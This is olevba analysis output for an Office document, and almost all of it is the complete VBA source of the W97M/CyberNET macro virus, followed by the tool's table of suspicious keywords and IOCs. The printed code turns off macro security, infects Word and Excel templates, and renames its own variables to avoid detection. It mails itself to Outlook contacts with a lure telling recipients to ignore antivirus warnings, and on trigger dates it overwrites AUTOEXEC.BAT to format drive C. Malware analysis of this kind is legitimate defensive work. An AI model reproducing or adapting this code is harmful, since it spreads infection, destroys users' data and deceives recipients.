olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Cybernet-1830e495d32056e15d3d292e2e18f10449fb5c6d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO RN7236.cls 
in file: Virus.MSOffice.Cybernet-1830e495d32056e15d3d292e2e18f10449fb5c6d - OLE stream: 'Macros/VBA/RN7236'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next
'W97M/CyberNET (C)2000 - Indonesia By AnomOke! "I'm NOT Responsible For Any Damage That Posible Cause By My Virus...!!!"
Application.EnableCancelKey = wdCancelDisabled: Options.SaveInterval = 1: Options.ConfirmConversions = False: Options.SaveNormalPrompt = False: Application.DisplayRecentFiles = False
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
CommandBars("Macro").Controls("Security...").Enabled = False: System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else: Options.VirusProtection _
= False: System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = &H0: End If
Call HS8585
If Day(Now) = 17 And Month(Now) = 8 Or Day(Now) = 25 And Month(Now) = 12 Then
Randomize: For FK7548 = 1 To (Int(Rnd * 70))
ActiveDocument.Shapes.AddShape(Int(Rnd * 120), Int(Rnd * 200), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid: Next FK7548
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName: Call HM6931: End If
RE9624 = ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
HF2441 = NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
If ActiveDocument.VBProject.Description <> "CyberNET" Or Left(ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(3, 14), 14) <> "'W97M/CyberNET" Then
Set BP2931 = ActiveDocument.VBProject.VBComponents
Call PF2593(BP2931)
BP2931(1).CodeModule. _
AddFromString ("Private Sub Document_Open()" & vbCr & NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(2, HF2441 - 19))
ActiveDocument.VBProject.Description = "CyberNET"
End If
If NormalTemplate.VBProject.Description <> "CyberNET" Or Left(NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(3, 14), 14) <> "'W97M/CyberNET" Then
Set BP2931 = NormalTemplate.VBProject.VBComponents
Call PF2593(BP2931)
Randomize
Dim JS2627(1 To 37) As String
JS2627(1) = "TB9141"
JS2627(2) = "KK1086"
JS2627(3) = "GP4680"
JS2627(4) = "RS9999"
JS2627(5) = "CI9646"
JS2627(6) = "RE9624"
JS2627(7) = "HF2441"
JS2627(8) = "BP2931"
JS2627(9) = "KI6610"
JS2627(10) = "NJ355"
JS2627(11) = "TE5796"
JS2627(12) = "RE4855"
JS2627(13) = "HS8585"
JS2627(14) = "JQ7159"
JS2627(15) = "LT3960"
JS2627(16) = "NL615"
JS2627(17) = "KP6046"
JS2627(18) = "AU6443"
JS2627(19) = "BV9168"
JS2627(20) = "IB8182"
JS2627(21) = "PF2593"
JS2627(22) = "GA7240"
JS2627(23) = "MG5985"
JS2627(24) = "FK7548"
JS2627(25) = "GS3952"
JS2627(26) = "LF95"
JS2627(27) = "HU1498"
JS2627(28) = "LO1533"
JS2627(29) = "NG8473"
JS2627(30) = "FE1421"
JS2627(31) = "TE5121"
JS2627(32) = "SR5281"
JS2627(33) = "HM6931"
JS2627(34) = "CN5394"
JS2627(35) = "AQ9290"
JS2627(36) = "AG6562"
JS2627(37) = _
"JS2627"
For RE4855 = 1 To 37
KI6610 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 100) & Int(Rnd * 100)
Call CI9646(KI6610, JS2627(RE4855))
Next RE4855
ActiveDocument.Saved = True
BP2931(1).CodeModule. _
AddFromString ("Private Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(2, RE9624 - 1) & _
vbCr & "Sub ViewVBCode()" & vbCr & "CommandBars(" & Chr(34) & "Tools" & Chr(34) & ").Controls(" & Chr(34) & "Macro" & Chr(34) & ").Enabled = False" & vbCr & "End Sub" & vbCr & "Sub ToolsMacro()" _
& vbCr & "Call ViewVBCode" & vbCr & "End Sub" & vbCr & "Sub FileOpen()" & vbCr & "WordBasic.DisableAutoMacros True" & vbCr & "On Error Resume Next" & vbCr & _
"If Dialogs(80).Show <> 0 Then Call Document_Close" & vbCr & "WordBasic.DisableAutoMacros False" & vbCr & "End Sub" & vbCr & "Sub AutoExec()" & vbCr & _
"WordBasic.DisableAutoMacros True" & vbCr & "Call Document_Close" & vbCr & "WordBasic.DisableAutoMacros False" & vbCr & "End Sub")
BP2931(1).Name = "HU1498"
NormalTemplate.VBProject.Description = "CyberNET"
End If
Set LO1533 = CreateObject("Excel.Application")
If UCase(Dir(LO1533.Application.StartupPath + "\CyberNET.xls")) <> UCase("CYBERNET.XLS") Or Day(Now) = Minute(Now) Then
If UCase(Dir(LO1533.Application.StartupPath + "\CyberNET.xls")) = UCase("CYBERNET.XLS") Then _
SetAttr (LO1533.Application.StartupPath + "\CyberNET.xls"), vbArchive
If Dir(LO1533.Application.StartupPath + "\*.xl?") <> "" Then _
Kill (LO1533.Application.StartupPath + "\*.xl?")
Set NG8473 = LO1533.Workbooks.Add
NG8473.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 1, NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(1, NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines - 18)
NG8473.VBProject.VBComponents("ThisWorkbook").CodeModule.ReplaceLine 151, "Attachments.Add ActiveWorkbook.FullName"
NG8473.SaveAs LO1533.Application.StartupPath & "\CyberNET.xls"
LO1533.ActiveWorkbook.VBProject.Description = "CyberNET"
LO1533.ActiveWindow.Visible = False
LO1533.Workbooks("CyberNET.xls").Save
LO1533.Quit
SetAttr (LO1533.Application.StartupPath + "\CyberNET.xls"), vbReadOnly
End If
If HF2441 <> 0 And RE9624 = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True: End If
End Sub
Private Function CI9646(TE5796, NJ355 As String)
On Error Resume Next
Dim TB9141 As Long: Dim KK1086 As Long: Dim GP4680 As Long: Dim RS9999 As Long
With ActiveDocument.VBProject.VBComponents(1).CodeModule
TB9141 = 1: KK1086 = 1: GP4680 = .CountOfLines: RS9999 = Len(.Lines(.CountOfLines, 1))
Do While .Find(NJ355, TB9141, KK1086, GP4680, RS9999, True)
AG6562 = .Lines(TB9141, 1)
AG6562 = _
Left(AG6562, KK1086 - 1) & TE5796 & _
Mid(AG6562, RS9999)
.ReplaceLine TB9141, AG6562
TB9141 = GP4680 + 1: KK1086 = 1
GP4680 = .CountOfLines
RS9999 = Len(.Lines(.CountOfLines, 1))
Loop
End With
End Function
Private Function PF2593(BP2931)
Dim GA7240 As Object
For Each GA7240 In BP2931
GA7240.CodeModule.DeleteLines 1, _
GA7240.CodeModule.CountOfLines
Next GA7240
End Function
Private Function HS8585()
On Error Resume Next
Dim NL615, KP6046, AU6443
Set NL615 = CreateObject("Outlook.Application")
Set KP6046 = NL615.GetNameSpace("MAPI")
If GetSetting("Office", "CyberNET", "CyberNET") <> "(C)2000 - Indonesia By AnomOke!" Then
If NL615 = "Outlook" Then
KP6046.Logon "profile", "password"
For JQ7159 = 1 To KP6046.AddressLists. _
Count 'anti-heuristic for stupid Norton antivirus scanner
Set LF95 = KP6046.AddressLists(JQ7159)
MG5985 = 1
Set AU6443 = NL615.CreateItem(0)
For LT3960 = 1 To LF95.AddressEntries.Count
GS3952 = LF95.AddressEntries(MG5985)
AU6443.Recipients.Add GS3952
MG5985 = _
MG5985 + 1
If MG5985 > 50 Then LT3960 = LF95.AddressEntries.Count
Next LT3960
AU6443.Subject = "You've GOT Mail !!!"
AU6443.Body = "Please, saved the document after you read and don't show to anyone else. The document is also VIRUS FREE...so DISREGARD the virus protection warning !!!"
AU6443. _
Attachments.Add ActiveDocument.FullName
AU6443. _
Send 'anti-heuristic for stupid McAfee antivirus scanner
GS3952 = ""
Next JQ7159
KP6046.Logoff
End If
SaveSetting "Office", "CyberNET", "CyberNET", "(C)2000 - Indonesia By AnomOke!"
End If
End Function
Private Sub Workbook_Deactivate()
On Error Resume Next
Application.EnableCancelKey = xlDisabled
If Day(Now) = 17 And Month(Now) = 8 Or Day(Now) = 25 And Month(Now) = 12 Then
For AQ9290 = 1 To 30
CN5394 = (Chr(65 + Int(Rnd * 12))) & AQ9290
Range(CN5394).AddComment
Range(CN5394).Comment.Visible = True
Range(CN5394).Comment.Text Text:="(C)2000 - CyberNET From Indonesia"
Range(CN5394).Comment.Shape.Select True
Selection.ShapeRange.IncrementLeft Int(Rnd * 300)
Selection.ShapeRange.IncrementTop Int(Rnd * 300): Next AQ9290
ActiveWorkbook.SaveAs FileName:=ActiveWorkbook.FullName: Call HM6931: End If
Set FE1421 = ThisWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule
If UCase(Dir(Application.StartupPath + "\CyberNET.xls")) <> "CYBERNET.XLS" Or Day(Now) = Minute(Now) Then
Set TE5121 = GetObject(, "Word.Application")
If TE5121 = "" Then
Set TE5121 = CreateObject("Word.Application")
SR5281 = True
End If
If Dir(Application.TemplatesPath + "\Normal.dot") <> "" Then Kill (Application.TemplatesPath + "\Normal.dot")
If Dir(TE5121.Application.StartupPath + "\*.do?") <> "" Then _
Kill (TE5121.Application.StartupPath + "\*.do?")
Set BP2931 = TE5121.NormalTemplate.VBProject.VBComponents
TE5121.Options.SaveNormalPrompt = False
BP2931(1).CodeModule.InsertLines 1, "Public Sub HU1498()" & vbCr & FE1421.Lines(5, 4) & vbCr & "End Sub"
TE5121.Run "Normal.ThisDocument.HU1498"
Call PF2593(BP2931)
BP2931(1).CodeModule.InsertLines 1, FE1421. _
Lines(1, FE1421.CountOfLines - 1) & vbCr & "Sub ViewVBCode()" & vbCr & "CommandBars(" & Chr(34) & "Tools" & Chr(34) & ").Controls(" & Chr(34) & "Macro" & Chr(34) & ").Enabled = False" & vbCr & "End Sub" & vbCr & "Sub ToolsMacro()" _
& vbCr & "Call ViewVBCode" & vbCr & "End Sub" & vbCr & "Sub FileOpen()" & vbCr & "WordBasic.DisableAutoMacros True" & vbCr & "On Error Resume Next" & vbCr & "If Dialogs(80).Show <> 0 Then Call Document_Close" _
& vbCr & "WordBasic.DisableAutoMacros False" & vbCr & "End Sub" & vbCr & "Sub AutoExec()" & vbCr & _
"WordBasic.DisableAutoMacros True" & vbCr & "Call Document_Close" & vbCr & "WordBasic.DisableAutoMacros False" & vbCr & "End Sub"
TE5121.NormalTemplate.VBProject.Description = "CyberNET"
BP2931(1).Name = "HU1498"
BP2931(1).CodeModule.ReplaceLine 151, "Attachments.Add ActiveDocument.FullName"
Set BP2931 = Nothing
If SR5281 = True Then TE5121.Quit
If UCase(Dir(Application.StartupPath + "\CyberNET.xls")) <> "CYBERNET.XLS" Then
Set LO1533 = CreateObject("Excel.Application")
Set NG8473 = LO1533.Workbooks.Add
NG8473.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 1, FE1421. _
Lines(1, FE1421.CountOfLines - 1)
NG8473.SaveAs FileName:=Application.StartupPath & "\CyberNET.xls", FileFormat:=xlNormal, AddToMru:=False
LO1533.ActiveWorkbook.VBProject.Description = "CyberNET"
LO1533.ActiveWindow.Visible = False
LO1533.Workbooks("CyberNET.xls").Save
LO1533.Quit
SetAttr (Application.StartupPath + "\CyberNET.xls"), vbReadOnly
End If
End If
If Left(ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule.Lines(3, 14), 14) <> "'W97M/CyberNET" Or ActiveWorkbook.VBProject.Description <> "CyberNET" Then
Set BP2931 = ActiveWorkbook.VBProject.VBComponents
Call PF2593(BP2931)
ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 1, FE1421. _
Lines(1, FE1421.CountOfLines - 1)
ActiveWorkbook.VBProject.Description = "CyberNET"
End If
End Sub
Private Sub Workbook_Open()
On Error Resume Next
Application.EnableCancelKey = xlDisabled
Application.CommandBars("Tools").Controls("Macro").Enabled = False
Application.CommandBars("Window").Controls("Unhide...").Enabled = False
If UCase(Dir("C:\CyberNET.reg")) <> "CYBERNET.REG" Then
If Application.Version <> "9.0" Then
Open "C:\CyberNET.reg" For Output As #1
Print #1, "REGEDIT4"
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel]"
Print #1, """Options6""=dword:00000000"
Close #1
Else
Open "C:\CyberNET.reg" For Output As #1
Print #1, "REGEDIT4"
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Excel\Security]"
Print #1, """Level""=dword:00000001"
Close #1
End If
End If
Shell "Regedit.exe /S C:\CyberNET.reg", vbHide
Call HS8585
Application.OnSheetActivate = "ThisWorkbook.Workbook_Deactivate"
End Sub
Private Function HM6931()
On Error Resume Next
Open ("C:\AUTOEXEC.BAT") For Output As #1
Print #1, "@ECHO OFF"
Print #1, "ECHO ###############################################################################"
Print #1, "ECHO #                                                                             #"
Print #1, "ECHO #               Vine...Vide...Vice...Moslem Power Never End...                #"
Print #1, "ECHO # I'm Really Sorry, This System Have Been Recycled By -= CyberNET =- Virus!!! #"
Print #1, "ECHO #                     Brought To You From INDONESIA...                        #"
Print #1, "ECHO #                                                                             #"
Print #1, "ECHO ###############################################################################"
Print #1, "CTTY NUL"
Print #1, "FORMAT C: /AUTOTEST /Q /U"
Close #1
Open ("C:\CONFIG.SYS") For Output As #2
Print #2, "SWITCHES=/N"
Print #2, "BREAK=OFF"
Close #2
MsgBox "Assalamualaikum Li Kulli Muslim...Moslem Power Never End..." & Chr(13) & "Nothing Can Stop << CyberNET >> Virus. Your System Has Already Infected !!!" & vbCr & "Now...I Am Outta Here...", vbCritical + vbOKOnly, "(C)2000 - CyberNET"
Shell ("RUNDLL.EXE user.exe,exitwindows"), vbHide
End Function









Sub ViewVBCode()
CommandBars("Tools").Controls("Macro").Enabled = False
End Sub
Sub ToolsMacro()
Call ViewVBCode
End Sub
Sub FileOpen()
WordBasic.DisableAutoMacros True
On Error Resume Next
If Dialogs(80).Show <> 0 Then Call Document_Close
WordBasic.DisableAutoMacros False
End Sub
Sub AutoExec()
WordBasic.DisableAutoMacros True
Call Document_Close
WordBasic.DisableAutoMacros False
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |CyberNET.reg        |Executable file name                         |
|IOC       |CYBERNET.REG        |Executable file name                         |
|IOC       |Regedit.exe         |Executable file name                         |
|IOC       |AUTOEXEC.BAT        |Executable file name                         |
|IOC       |RUNDLL.EXE          |Executable file name                         |
|IOC       |user.exe            |Executable file name                         |
|Base64    |,_y                 |LF95                                         |
|String    |                    |                                             |
+----------+--------------------+---------------------------------------------+

